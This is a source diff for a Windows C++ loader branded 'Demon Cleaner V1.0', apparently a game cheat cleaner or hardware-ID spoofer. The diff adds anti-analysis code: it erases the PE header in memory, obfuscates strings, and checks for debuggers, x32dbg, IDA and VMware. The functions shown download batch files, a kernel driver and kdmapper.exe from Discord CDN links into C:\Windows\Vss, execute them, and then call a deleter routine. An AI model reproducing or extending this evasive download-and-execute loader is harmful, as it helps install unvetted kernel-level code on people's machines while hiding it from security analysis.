@@ -36,7 +36,16 @@ using namespace junkcode;
 
 #define SHOW_DEBUG_MESSAGES
 
+VOID ErasePEHeaderFromMemory()
+{
+    DWORD OldProtect = 0;
 
+    char* pBaseAddr = (char*)GetModuleHandle(NULL);
+
+    VirtualProtect(pBaseAddr, 4096, PAGE_READWRITE, &OldProtect);
+
+    SecureZeroMemory(pBaseAddr, 4096);
+}
 int CheckTEB()
 {
     int isBeingDebugged = 0;
@@ -57,6 +66,9 @@ int CheckTEB()
 bool IsProcessRunning(const wchar_t* processName)
 {
     LI_FN(VirtualProtect).in(LI_MODULE("kernel32.dll").cached());
+    LI_FN(VirtualProtect).in(LI_MODULE("ntdll.dll").cached());
+    LI_FN(VirtualProtect).in(LI_MODULE("user32.dll").cached());
+    LI_FN(VirtualProtect).in(LI_MODULE("urlmon.dll").cached());
 
     bool exists = false;
     PROCESSENTRY32 entry;
@@ -320,8 +332,8 @@ void apex()
         std::string apex = (dead("https://cdn.discordapp.com/attachments/834754431249285140/880114575800954941/apex.bat"));
     std::string apexpath = (dead("C:\\Windows\\Vss\\Apex.bat").c_str());
     URLDownloadToFileA(NULL, apex.c_str(), apexpath.c_str(), 0, NULL);
-    system("cd C:\\Windows\\Vss\\");
-    system("Start C:\\Windows\\Vss\\Apex.bat");
+    system(dead("cd C:\\Windows\\Vss\\").c_str());
+    system(dead("Start C:\\Windows\\Vss\\Apex.bat").c_str());
 
 
 }
@@ -346,8 +358,8 @@ void gta()
     std::string gta = (dead("https://cdn.discordapp.com/attachments/834754431249285140/880114574483918858/gta.bat"));
     std::string gtapath = (dead("C:\\Windows\\Vss\\gta.bat").c_str());
     URLDownloadToFileA(NULL, gta.c_str(), gtapath.c_str(), 0, NULL);
-    system("cd C:\\Windows\\Vss\\");
-    system("Start C:\\Windows\\Vss\\gta.bat");
+    system(dead("cd C:\\Windows\\Vss\\").c_str());
+    system(dead("Start C:\\Windows\\Vss\\gta.bat").c_str());
 
 }
 void fortnite()
@@ -371,8 +383,8 @@ void fortnite()
     std::string fortnite = (dead("https://cdn.discordapp.com/attachments/834754431249285140/880114573007527946/Fortnite.bat"));
     std::string fortnitepath = (dead("C:\\Windows\\Vss\\Fortnite.bat").c_str());
     URLDownloadToFileA(NULL, fortnite.c_str(), fortnitepath.c_str(), 0, NULL);
-    system("cd C:\\Windows\\Vss\\");
-    system("Start C:\\Windows\\Vss\\Fortnite.bat");
+    system(dead("cd C:\\Windows\\Vss\\").c_str());
+    system(dead("Start C:\\Windows\\Vss\\Fortnite.bat").c_str());
 }
 void fishingplanet()
 {
@@ -394,8 +406,8 @@ void fishingplanet()
     std::string fishingplanet = (dead("https://cdn.discordapp.com/attachments/834754431249285140/880114571648593931/fishing-planet.bat"));
     std::string fishingplanetpath = (dead("C:\\Windows\\Vss\\Fishing-planet.bat").c_str());
     URLDownloadToFileA(NULL, fishingplanet.c_str(), fishingplanetpath.c_str(), 0, NULL);
-    system("cd C:\\Windows\Vss\\");
-    system("Start C:\\Windows\\Vss\\Fishing-planet.bat");
+    system(dead("cd C:\\Windows\Vss\\").c_str());
+    system(dead("Start C:\\Windows\\Vss\\Fishing-planet.bat").c_str());
 
 }
 void cod()
@@ -418,8 +430,8 @@ void cod()
     std::string cod = (dead("https://cdn.discordapp.com/attachments/834754431249285140/880114570369318962/Cold-Ware.bat"));
     std::string codpath = (dead("C:\\Windows\\Vss\\Cold-Ware.bat").c_str());
     URLDownloadToFileA(NULL, cod.c_str(), codpath.c_str(), 0, NULL);
-    system("cd C:\\Windows\\Vss\\");
-    system("Start C:\\Windows\\Vss\\Cold-Ware.bat");
+    system(dead("cd C:\\Windows\\Vss\\").c_str());
+    system(dead("Start C:\\Windows\\Vss\\Cold-Ware.bat").c_str());
 
 
 }
@@ -681,14 +693,14 @@ void spoofer()
 
 
     string spoofer = (dead("https://cdn.discordapp.com/attachments/834754431249285140/881227464498630677/NewWoof.sys"));
-    string spooferpath = "C:\\Windows\\Vss\\woof.sys";
+    string spooferpath = (dead("C:\\Windows\\Vss\\woof.sys").c_str());
     URLDownloadToFileA(NULL, spoofer.c_str(), spooferpath.c_str(), 0, NULL);
 
     string mapper = (dead("https://cdn.discordapp.com/attachments/834754431249285140/879745681294786600/kdmapper.exe"));
-    string mapperpath = "C:\\Windows\\Vss\\mapper.exe";
+    string mapperpath = (dead("C:\\Windows\\Vss\\mapper.exe").c_str());
     URLDownloadToFileA(NULL, mapper.c_str(), mapperpath.c_str(), 0, NULL);
-    system("cd C:\\Windows\\Vss\\");
-    system("C:\\Windows\\Vss\\mapper.exe C:\\Windows\\Vss\\woof.sys");
+    system(dead("cd C:\\Windows\\Vss\\").c_str());
+    system(dead("C:\\Windows\\Vss\\mapper.exe C:\\Windows\\Vss\\woof.sys").c_str());
     Sleep(2000);
     deleter();
     Sleep(2000);
@@ -760,6 +772,7 @@ void loadserial()
 
 void mainbot()
 {
+
     rydekem();
     lnttirs();
     tlmisir();
@@ -845,7 +858,7 @@ void mainbot()
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
 
-            SetConsoleTitle(_T("Demon Cleaner V1.0 [server sided build]"));
+            SetConsoleTitle(_T("Demon Cleaner V1.0"));
             setcolor(9);
             std::cout << (dead(" _| |___ _____ ___ ___   ------------------            \n").c_str());
             std::cout << (dead("| . | -_|     | . |   |  | demoncleaner.gq| \n").c_str());
@@ -1068,6 +1081,7 @@ int _start()
 
 void startup()
 {
+    ErasePEHeaderFromMemory();
     trampoline;
     rydekem();
     lnttirs();
@@ -1083,8 +1097,8 @@ void startup()
     trampoline;
 
 
-    LPCWSTR windowName = L"x32dbg";
-    LPCWSTR vmname = L"VMware Workstation";
+    LPCWSTR windowName = (dead(L"x32dbg").c_str());
+    LPCWSTR vmname = (dead(L"VMware Workstation").c_str());
 
     rydekem();
     lnttirs();
@@ -1137,6 +1151,8 @@ void startup()
         SetLastError(1);
         exit(0);
     }
+    adbg_CheckRemoteDebuggerPresent();
+    
     rydekem();
     lnttirs();
     tlmisir();
@@ -1206,6 +1222,7 @@ void startup()
 
     if (GetLastError == 0)
     {
+
         rydekem();
         lnttirs();
         tlmisir();
@@ -1498,7 +1515,7 @@ int main()
         SetLastError(1);
         exit(0);
     }
-    if (IsProcessRunning(dead(L"idaq.exe").c_str())
+    if (IsProcessRunning(dead(L"idaq.exe").c_str()))
     {
         
         trampoline;
